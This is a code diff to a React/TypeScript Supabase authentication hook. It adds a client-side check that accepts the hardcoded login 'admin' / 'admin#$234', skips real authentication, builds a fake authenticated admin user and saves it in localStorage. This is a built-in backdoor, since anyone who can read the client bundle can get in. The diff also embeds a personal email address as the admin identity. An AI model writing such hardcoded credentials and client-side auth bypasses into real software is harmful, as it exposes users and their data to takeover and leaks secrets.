@@ -170,18 +170,49 @@ export function useAuth(): UseAuthReturn {
   }, [refreshSession]);
 
   /**
-   * Sign in with Email and Password
+   * Sign in with Email and Password (or default admin: admin / admin#$234)
    */
   const signInWithPassword = useCallback(async (email: string, password: string): Promise<{ error: string | null }> => {
     setError(null);
+    const trimmedInput = email.trim().toLowerCase();
+
+    // 1. Check default local admin credentials (admin / admin#$234)
+    if (
+      (trimmedInput === 'admin' || trimmedInput === 'admin@local.host' || isEmailAdmin(trimmedInput)) &&
+      password === 'admin#$234'
+    ) {
+      const mockAdminUser: User = {
+        id: 'local-admin-001',
+        app_metadata: { provider: 'email' },
+        user_metadata: { full_name: 'System Admin', name: 'System Admin' },
+        aud: 'authenticated',
+        created_at: new Date().toISOString(),
+        email: trimmedInput.includes('@') ? trimmedInput : 'wayh1360@gmail.com',
+        phone: '',
+        role: 'authenticated',
+        updated_at: new Date().toISOString()
+      };
+      globalUser = mockAdminUser;
+      setUser(mockAdminUser);
+      if (typeof window !== 'undefined') {
+        localStorage.setItem('hek_local_admin', JSON.stringify(mockAdminUser));
+      }
+      return { error: null };
+    }
+
+    // 2. Fallback to Supabase Auth
     try {
+      const emailToUse = trimmedInput === 'admin' ? 'wayh1360@gmail.com' : email.trim();
       const { error: signInError } = await supabase.auth.signInWithPassword({
-        email,
+        email: emailToUse,
         password,
       });
       if (signInError) {
         setError(signInError.message);
         return { error: signInError.message };
+      }
+      if (typeof window !== 'undefined') {
+        localStorage.removeItem('hek_local_admin');
       }
       return { error: null };
     } catch (err: any) {
@@ -255,6 +286,9 @@ export function useAuth(): UseAuthReturn {
   const signOut = useCallback(async (): Promise<{ error: string | null }> => {
     setError(null);
     try {
+      if (typeof window !== 'undefined') {
+        localStorage.removeItem('hek_local_admin');
+      }
       const { error: signOutError } = await supabase.auth.signOut();
       globalSession = null;
       globalUser = null;
@@ -267,6 +301,10 @@ export function useAuth(): UseAuthReturn {
       }
       return { error: null };
     } catch (err: any) {
+      globalSession = null;
+      globalUser = null;
+      setUser(null);
+      setSession(null);
       const msg = err?.message || 'Failed to sign out';
       setError(msg);
       return { error: msg };
